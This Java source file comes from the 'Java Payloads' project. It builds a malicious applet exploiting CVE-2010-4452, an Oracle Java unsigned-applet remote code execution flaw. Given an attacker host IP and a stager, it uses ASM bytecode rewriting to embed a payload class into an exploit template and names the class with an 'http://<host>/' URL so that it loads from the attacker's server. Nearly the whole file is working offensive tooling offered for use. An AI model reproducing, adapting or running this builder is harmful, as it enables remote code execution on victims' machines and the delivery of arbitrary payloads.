/*
 * Java Payloads.
 * 
 * Copyright (c) 2010, 2011 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

/*
 * Oracle Java Unsigned Applet Applet2ClassLoader Remote Code Execution
 * Vulnerability (CVE-2010-4452) based on
 *  
 * <http://fhoguin.com/2011/03/oracle-java-unsigned-applet-applet2classloader-remote-code-execution-vulnerability-zdi-11-084-explained/>
 * 
 * To use, you have to build an applet class for the IP address of the 
 * attacker host and use it as described in the article.
 */
package javapayload.builder;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.InetAddress;

import javapayload.exploit.CVE_2010_4452;

import org.objectweb.asm.ClassAdapter;
import org.objectweb.asm.ClassReader;
import org.objectweb.asm.ClassVisitor;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.FieldVisitor;
import org.objectweb.asm.MethodAdapter;
import org.objectweb.asm.MethodVisitor;
import org.objectweb.asm.Opcodes;

public class CVE_2010_4452_AppletClassBuilder extends Builder {

	public static void main(String[] args) throws Exception {
		if (args.length != 2 && args.length != 3) {
			System.out.println("Usage: java javapayload.builder.CVE_2010_4452_AppletClassBuilder "+new CVE_2010_4452_AppletClassBuilder().getParameterSyntax());
			return;
		}
		new CVE_2010_4452_AppletClassBuilder().build(args);
	}

	private CVE_2010_4452_AppletClassBuilder() throws Exception {
		super("Build an applet that exploits CVE-2010-4452", "Use the source, Luke!");
	}
	
	public String getParameterSyntax() {
		return "<host> <stager> [<classname>]";
	}
	
	protected int getMinParameterCount() {
		return 2;
	}
	
	public void build(String[] args) throws Exception {
		String host = args[0];
		if (host.indexOf('.') != -1) {
			byte[] ip = InetAddress.getByName(args[0]).getAddress();
			if (ip.length != 4)
				throw new IllegalArgumentException("Only IPv4 addressess supported");
			long ipValue = ((ip[0] & 0xFFL) << 24) | ((ip[1] & 0xFFL) << 16) | ((ip[2] & 0xFFL) << 8) | ((ip[3] & 0xFFL) << 0);
			host = "" + ipValue;
		}
		final String stager = args[1];
		String classname = stager + "Class";
		if (args.length == 3) {
			classname = args[2];
		}
		final String fullClassName = "http://" + host + "/" + classname;
		System.out.println("Creating class " + fullClassName);
		ClassBuilder.main(new String[] { stager, "EmbeddedPayload" });
		FileInputStream fis = new FileInputStream("EmbeddedPayload.class");
		StringBuffer sb = new StringBuffer();
		byte[] buf = new byte[4096];
		int len;
		while ((len = fis.read(buf)) != -1) {
			sb.append(new String(buf, 0, len, "ISO-8859-1"));
		}
		final String classContent = sb.toString();
		fis.close();
		if (!new File("EmbeddedPayload.class").delete())
			throw new IOException("Cannot delete file");

		final ClassWriter cw = new ClassWriter(0);
		final ClassVisitor templateVisitor = new ClassAdapter(cw) {
			public void visit(int version, int access, String name, String signature, String superName, String[] interfaces) {
				super.visit(Opcodes.V1_5, access, fullClassName, signature, superName, interfaces);
			}

			public FieldVisitor visitField(int access, String name, String desc, String signature, Object value) {
				return super.visitField(access, name, desc, signature, value);
			}

			public MethodVisitor visitMethod(int access, String name, String desc, String signature, String[] exceptions) {

				return new MethodAdapter(super.visitMethod(access, name, desc, signature, exceptions)) {
					private String cleanType(String type) {
						if (type.equals("javapayload/exploit/CVE_2010_4452")) {
							type = fullClassName;
						}
						return type;
					}

					public void visitFieldInsn(int opcode, String owner, String name, String desc) {
						super.visitFieldInsn(opcode, cleanType(owner), name, desc);
					}

					public void visitMethodInsn(int opcode, String owner, String name, String desc) {
						super.visitMethodInsn(opcode, cleanType(owner), name, desc);
					}

					public void visitTypeInsn(int opcode, String type) {
						super.visitTypeInsn(opcode, cleanType(type));
					}

					public void visitLdcInsn(Object cst) {
						if ("TO_BE_REPLACED".equals(cst))
							cst = classContent;
						super.visitLdcInsn(cst);
					}
				};
			}
		};
		visitClass(CVE_2010_4452.class, templateVisitor, cw);
		final FileOutputStream fos = new FileOutputStream(classname + ".class");
		fos.write(cw.toByteArray());
		fos.close();
	}

	private static void visitClass(Class clazz, ClassVisitor stagerVisitor, ClassWriter cw) throws Exception {
		final InputStream is = ClassBuilder.class.getResourceAsStream("/" + clazz.getName().replace('.', '/') + ".class");
		final ClassReader cr = new ClassReader(is);
		cr.accept(stagerVisitor, ClassReader.SKIP_DEBUG);
		is.close();
	}
}
